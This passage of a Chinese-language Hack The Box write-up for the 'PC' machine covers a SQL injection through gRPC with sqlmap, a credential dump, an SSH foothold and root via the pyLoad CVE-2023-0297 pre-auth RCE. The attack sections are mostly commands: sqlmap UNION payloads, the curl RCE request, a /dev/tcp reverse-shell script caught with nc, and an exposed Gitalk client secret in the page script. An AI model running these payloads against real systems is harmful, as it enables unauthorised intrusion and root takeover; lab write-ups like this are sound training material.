class="hljs-number">2</span>))))<span class="hljs-string">&quot;&#125;]&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="hljs-string">    Payload: &#123;&quot;</span>metadata<span class="hljs-string">&quot;:[&#123;&quot;</span>name<span class="hljs-string">&quot;:&quot;</span>token<span class="hljs-string">&quot;,&quot;</span>value<span class="hljs-string">&quot;:&quot;</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc<span class="hljs-string">&quot;&#125;],&quot;</span>data<span class="hljs-string">&quot;:[&#123;&quot;</span><span class="hljs-built_in">id</span><span class="hljs-string">&quot;:&quot;</span>-8074 UNION ALL SELECT CHAR(113,120,112,118,113)||CHAR(118,74,83,118,77,111,65,111,103,88,73,118,108,116,111,82,73,66,104,82,83,67,77,89,81,73,100,122,118,122,71,75,72,70,76,81,107,117,69,69)||CHAR(113,112,112,106,113)-- ngxu<span class="hljs-string">&quot;&#125;]&#125;</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[08:13:15] [INFO] the back-end DBMS is SQLite</span><br><span class="hljs-string">back-end DBMS: SQLite</span><br><span class="hljs-string">[08:13:15] [INFO] fetching tables for database: &#x27;SQLite_masterdb&#x27;</span><br><span class="hljs-string">[08:13:15] [INFO] fetching columns for table &#x27;messages&#x27;</span><br><span class="hljs-string">[08:13:15] [INFO] fetching entries for table &#x27;messages&#x27;</span><br><span class="hljs-string">Database: &lt;current&gt;</span><br><span class="hljs-string">Table: messages</span><br><span class="hljs-string">[1 entry]</span><br><span class="hljs-string">+-----+-------------------+----------+</span><br><span class="hljs-string">| id  | message           | username |</span><br><span class="hljs-string">+-----+-------------------+----------+</span><br><span class="hljs-string">| 164 | Will update soon. | admin    |</span><br><span class="hljs-string">+-----+-------------------+----------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[08:13:15] [INFO] table &#x27;SQLite_masterdb.messages&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv&#x27;</span><br><span class="hljs-string">[08:13:15] [INFO] fetching columns for table &#x27;accounts&#x27;</span><br><span class="hljs-string">[08:13:15] [INFO] fetching entries for table &#x27;accounts&#x27;</span><br><span class="hljs-string">Database: &lt;current&gt;</span><br><span class="hljs-string">Table: accounts</span><br><span class="hljs-string">[2 entries]</span><br><span class="hljs-string">+------------------------+----------+</span><br><span class="hljs-string">| password               | username |</span><br><span class="hljs-string">+------------------------+----------+</span><br><span class="hljs-string">| admin                  | admin    |</span><br><span class="hljs-string">| ********************** | sau      |</span><br><span class="hljs-string">+------------------------+----------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[08:13:15] [INFO] table &#x27;SQLite_masterdb.accounts&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv&#x27;</span><br><span class="hljs-string">[08:13:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/127.0.0.1&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] ending @ 08:13:15 /2023-07-16/</span><br></code></pre></td></tr></table></figure>

<p>我们拿到了一个sau用户的登录凭证，那自然是要去ssh试试的。</p>
<h3 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh sau@10.10.11.214<br>sau@10.10.11.214<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Last login: Mon May 15 09:00:44 2023 from 10.10.14.19</span><br><span class="hljs-string">sau@pc:~$ </span><br></code></pre></td></tr></table></figure>

<p>发现成功登录，在home目录下拿到了user flag。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上来就发现里面文件乱糟糟的，啥都有，先给机器reset一下再说。</p>
<h3 id="三连"><a href="#三连" class="headerlink" title="三连"></a>三连</h3><p>reset完就很清爽。依然是熟悉的<code>sudo -l</code>、<code>find SUID bins</code>以及<code>cat crontab</code>三步走。也依然是熟悉的啥也没发现。</p>
<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>不管三七二十一先把linpeas以及pspy传上去再说。在我们将其传到&#x2F;tmp目录下，正准备linpeas看一眼的时候，我们发现tmp目录下有个pyLoad目录，不仅如此，它还是root所有的权限为755的目录，这不是邀请我们进去看看吗，却之不恭，看看再说。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:/tmp$ ll<br>total 3912<br>drwxrwxrwt 15 root root    4096 Jul 16 09:34 ./<br>drwxr-xr-x 21 root root    4096 Apr 27 15:23 ../<br>drwxrwxrwt  2 root root    4096 Jul 16 09:28 .ICE-unix/<br>drwxrwxrwt  2 root root    4096 Jul 16 09:28 .Test-unix/<br>drwxrwxrwt  2 root root    4096 Jul 16 09:28 .X11-unix/<br>drwxrwxrwt  2 root root    4096 Jul 16 09:28 .XIM-unix/<br>drwxrwxrwt  2 root root    4096 Jul 16 09:28 .font-unix/<br>-rwxrwxr-x  1 sau  sau   836190 Jul  2 04:28 linpeas.sh*<br>-rwxrwxr-x  1 sau  sau  3104768 Jan 17 21:09 pspy64*<br>drwxr-xr-x  4 root root    4096 Jul 16 09:28 pyLoad/<br>drwx------  3 root root    4096 Jul 16 09:28 snap-private-tmp/<br>drwx------  3 root root    4096 Jul 16 09:28 systemd-private-d85c45b90a014dc6a8a5f5baa1c3abd3-ModemManager.service-0r4IYg/<br>drwx------  3 root root    4096 Jul 16 09:28 systemd-private-d85c45b90a014dc6a8a5f5baa1c3abd3-systemd-logind.service-pB1Ivg/<br>drwx------  3 root root    4096 Jul 16 09:28 systemd-private-d85c45b90a014dc6a8a5f5baa1c3abd3-systemd-resolved.service-S9bgKi/<br>drwx------  2 root root    4096 Jul 16 09:28 tmps7fk1b_z/<br>drwx------  2 sau  sau     4096 Jul 16 09:33 tmux-1001/<br>drwx------  2 root root    4096 Jul 16 09:28 vmware-root_738-2999591909/<br>sau@pc:/tmp$ <span class="hljs-built_in">cd</span> pyLoad/<br>sau@pc:/tmp/pyLoad$ <span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x  4 root root 4096 Jul 16 09:28 .<br>drwxrwxrwt 15 root root 4096 Jul 16 09:34 ..<br>drwxr-xr-x  2 root root 4096 Jul 16 09:28 flask<br>drwxr-xr-x  2 root root 4096 Jul 16 09:28 jinja<br>-rw-r--r--  1 root root    4 Jul 16 09:28 pyload.pid<br>sau@pc:/tmp/pyLoad$ <span class="hljs-built_in">cat</span> pyload.pid<br>1050<br>sau@pc:/tmp/pyLoad$ ps aux | grep 1050<br>root        1050  0.1  1.4 1215780 58300 ?       Ssl  09:28   0:02 /usr/bin/python3 /usr/local/bin/pyload<br>sau        21801  0.0  0.0   8160  2544 pts/0    S+   09:50   0:00 grep --color=auto 1050<br></code></pre></td></tr></table></figure>

<p>发现里面有flask和jinja，明显是python模块，此外还专门放了个pyload.pid文件告诉我们pyload运行的pid是105。这pyload是几号人物，给这么多画面。</p>
<p>好奇宝宝直接进行一个谷歌的查pyload exploit是不是有猫腻。结果我们确实发现了其存在<code>Pre-auth RCE in pyLoad</code>的漏洞。且github上有详细的<a target="_blank" rel="noopener" href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">PoC</a>。</p>
<h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>那么现在是道理我都懂环节了，但是这个pyload究竟跑在哪里，跑在什么端口呢？</p>
<p>我们直接<code>netstat -nat</code>看一看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:/tmp$ netstat -nat<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State<br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN<br>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN<br>tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN<br>tcp        0     41 10.10.11.214:22         10.10.14.81:54582       ESTABLISHED<br>tcp        0     41 10.10.11.214:22         10.10.14.81:54568       ESTABLISHED<br>tcp        0    208 10.10.11.214:22         10.10.14.96:53820       ESTABLISHED<br>tcp6       0      0 :::22                   :::*                    LISTEN<br>tcp6       0      0 :::50051                :::*                    LISTEN<br></code></pre></td></tr></table></figure>

<p>做个排除法，跑在本地显然不是22，那就是8000或者9666了。</p>
<p>我们先curl看看8000端口什么情况。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:/tmp$ curl 127.0.0.1:8000<br>&lt;!doctype html&gt;<br>&lt;html lang=en&gt;<br>&lt;title&gt;Redirecting...&lt;/title&gt;<br>&lt;h1&gt;Redirecting...&lt;/h1&gt;<br>&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=<span class="hljs-string">&quot;/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&quot;</span>&gt;/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F&lt;/a&gt;. If not, click the <span class="hljs-built_in">link</span>.<br></code></pre></td></tr></table></figure>

<p>看来是跳转了，我们用ssh端口转发到本地，用浏览器打开看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214<br>sau@10.10.11.214<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Last login: Sun Jul 16 09:28:58 2023 from 10.10.14.96</span><br><span class="hljs-string">sau@pc:~$</span><br></code></pre></td></tr></table></figure>

<p>访问一下网站：</p>
<p class='item-img' data-src='/pic/assets/7bc48a63a95bd5768a72adbc404301e1.png'><img src="/pic/assets/7bc48a63a95bd5768a72adbc404301e1.png" alt="7bc48a63a95bd5768a72adbc404301e1"></p>
<p>发现确实是pyload服务，那我们就完成了pyload服务的定位。</p>
<h3 id="PoC验证"><a href="#PoC验证" class="headerlink" title="PoC验证"></a>PoC验证</h3><p>我们试试8000端口能否验证PoC。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:/tmp$ curl -i -s -k -X $<span class="hljs-string">&#x27;POST&#x27;</span> \<br>&gt;     --data-binary $<span class="hljs-string">&#x27;jk=pyimport%20os;os.system(\&quot;touch%20/tmp/pwnd\&quot;);f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;</span> \<br>&gt;     $<span class="hljs-string">&#x27;http://127.0.0.1:8000/flash/addcrypted2&#x27;</span><br>HTTP/1.1 500 INTERNAL SERVER ERROR<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 21<br>Access-Control-Max-Age: 1800<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Methods: OPTIONS, GET, POST<br>Vary: Accept-Encoding<br>Date: Mon, 17 Jul 2023 03:32:56 GMT<br>Server: Cheroot/8.6.0<br><br>Could not decrypt keysau@pc:/tmp$ ll<br>total 56<br>drwxrwxrwt 14 root root 4096 Jul 17 03:32 ./<br>drwxr-xr-x 21 root root 4096 Apr 27 15:23 ../<br>drwxrwxrwt  2 root root 4096 Jul 16 22:36 .ICE-unix/<br>drwxrwxrwt  2 root root 4096 Jul 16 22:36 .Test-unix/<br>drwxrwxrwt  2 root root 4096 Jul 16 22:36 .X11-unix/<br>drwxrwxrwt  2 root root 4096 Jul 16 22:36 .XIM-unix/<br>drwxrwxrwt  2 root root 4096 Jul 16 22:36 .font-unix/<br>-rw-r--r--  1 root root    0 Jul 17 03:32 pwnd<br>drwxr-xr-x  4 root root 4096 Jul 16 22:36 pyLoad/<br>drwx------  3 root root 4096 Jul 16 22:36 snap-private-tmp/<br>drwx------  3 root root 4096 Jul 16 22:36 systemd-private-8676c1abcb0544dcafbf10e3593865c9-ModemManager.service-Zc8bxj/<br>drwx------  3 root root 4096 Jul 16 22:36 systemd-private-8676c1abcb0544dcafbf10e3593865c9-systemd-logind.service-BKbnLh/<br>drwx------  3 root root 4096 Jul 16 22:36 systemd-private-8676c1abcb0544dcafbf10e3593865c9-systemd-resolved.service-jHIx6e/<br>drwx------  2 root root 4096 Jul 16 22:36 tmphwhrrtgk/<br>drwx------  2 root root 4096 Jul 16 22:37 vmware-root_733-4248680474/<br></code></pre></td></tr></table></figure>

<p>一发入魂，虽然返回报了500，但是文件确实以root身份创建了。也就是说我们能以root身份进行任意命令执行。那就简单了，给bash赋s位，写入sudoer都行，但是考虑到是多人共用靶机，我们选用影响最小的方式</p>
<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>影响最小的方式当然是反弹shell了，我直接创建一个名叫exp.sh的shell脚本反弹shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -i &gt;&amp;  /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#x27;</span> &gt; exp.sh<br>sau@pc:/tmp$ curl -i -s -k -X $<span class="hljs-string">&#x27;POST&#x27;</span>     --data-binary $<span class="hljs-string">&#x27;jk=pyimport%20os;os.system(\&quot;bash%20/tmp/exp.sh&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;</span>     $<span class="hljs-string">&#x27;http://127.0.0.1:8000/flash/addcrypted2&#x27;</span>rypted2<span class="hljs-string">&#x27;</span><br><span class="hljs-string">HTTP/1.1 500 INTERNAL SERVER ERROR</span><br><span class="hljs-string">Content-Type: text/html; charset=utf-8</span><br><span class="hljs-string">Content-Length: 17467</span><br><span class="hljs-string">Access-Control-Max-Age: 1800</span><br><span class="hljs-string">Access-Control-Allow-Origin: *</span><br><span class="hljs-string">Access-Control-Allow-Methods: OPTIONS, GET, POST</span><br><span class="hljs-string">Vary: Accept-Encoding</span><br><span class="hljs-string">Date: Sun, 16 Jul 2023 11:54:22 GMT</span><br><span class="hljs-string">Server: Cheroot/8.6.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">......</span><br></code></pre></td></tr></table></figure>

<p>本地nc监听成功拿到root shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -nlvp &lt;PORT&gt;<br>listening on [any] &lt;PORT&gt; ...<br>connect to [IP] from (UNKNOWN) [10.10.11.214] 38762<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1050): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@pc:~/.pyload/data<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@pc:~<span class="hljs-comment"># ll</span><br>ll<br>total 68<br>drwx------  7 root root  4096 Apr 27 15:32 ./<br>drwxr-xr-x 21 root root  4096 Apr 27 15:23 ../<br>lrwxrwxrwx  1 root root     9 Jan 11  2023 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc<br>drwxr-xr-x  3 root root  4096 Apr  4 10:25 .cache/<br>drwxr-xr-x  3 root root  4096 Apr  4 10:25 .<span class="hljs-built_in">local</span>/<br>-rw-r--r--  1 root root   161 Dec  5  2019 .profile<br>drwxr-xr-x  7 root root  4096 Jan 11  2023 .pyload/<br>-rw-------  1 root root  3203 Apr 27 15:32 .viminfo<br>drwxr-xr-x  3 root root  4096 Apr 27 13:15 Downloads/<br>-rw-r-----  1 root root    33 Jul 16 09:28 root.txt<br>drwx------  3 root root  4096 Jan 11  2023 snap/<br>-rw-r--r--  1 root root 24576 Jan 11  2023 sqlite.db.bak<br></code></pre></td></tr></table></figure>

<p>成功拿到root flag。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/18/MonitorsTwo/">← Next [HTB]  MonitorsTwo</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/15/topology/">[HTB]  topology Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text">服务探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gRPC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">gRPC信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLmap"><span class="toc-number">3.1.</span> <span class="toc-text">SQLmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">获取立足点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E8%BF%9E"><span class="toc-number">4.1.</span> <span class="toc-text">三连</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞定位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC%E9%AA%8C%E8%AF%81"><span class="toc-number">4.4.</span> <span class="toc-text">PoC验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0root"><span class="toc-number">4.5.</span> <span class="toc-text">提权到root</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>